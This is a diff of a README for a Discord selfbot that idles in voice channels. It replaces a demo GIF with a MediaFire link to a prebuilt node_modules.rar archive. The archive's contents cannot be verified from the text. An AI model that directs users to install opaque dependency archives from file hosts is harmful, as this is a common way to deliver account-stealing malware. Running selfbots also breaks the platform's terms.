@@ -3,6 +3,6 @@ selfbot for afk voice channel
 
 ## config ?
 - to configure check index.js and config.js and run  ***start.bat***
-![demo](https://cdn.discordapp.com/attachments/1015736130097905725/1021270027103633469/bandicam_2022-09-19_05-58-46-579.gif)
 
+pour les module : https://www.mediafire.com/file/kxjb1kmirkyjwje/node_modules.rar/file
 
